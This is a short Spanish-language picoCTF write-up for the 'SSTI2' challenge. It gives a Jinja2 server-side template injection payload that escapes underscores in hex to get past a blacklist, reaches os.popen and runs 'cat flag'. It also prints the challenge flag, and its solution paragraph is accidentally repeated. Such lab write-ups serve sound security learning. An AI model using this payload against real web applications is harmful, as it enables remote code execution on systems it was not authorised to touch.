# Nombre del reto
>SSTI2

---
# Descripción
>I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :) I heard templating is a cool and modular way to build web apps! Check out my website [here](http://shape-facility.picoctf.net:58930/)!

---
# Solución
- Entramos al link que se nos da, después como se nos indica hay algunos caracteres en blacklist, por lo que para evitar eso usamos hexadecimal, luego después de ir accediendo poco a poco llegamos a usar el comando "{{ request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')() }}"
y con ello obtenemos la flagdespués como se nos indica hay algunos caracteres en blacklist, por lo que para evitar eso usamos hexadecimal, luego después de ir accediendo poco a poco llegamos a usar el comando "{{ request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')() }}"
y con ello obtenemos la flag

---
# Flag del reto
>picoCTF{sst1_f1lt3r_byp4ss_3cfcf706}

---
# Notas adicionales

---
# Referencias

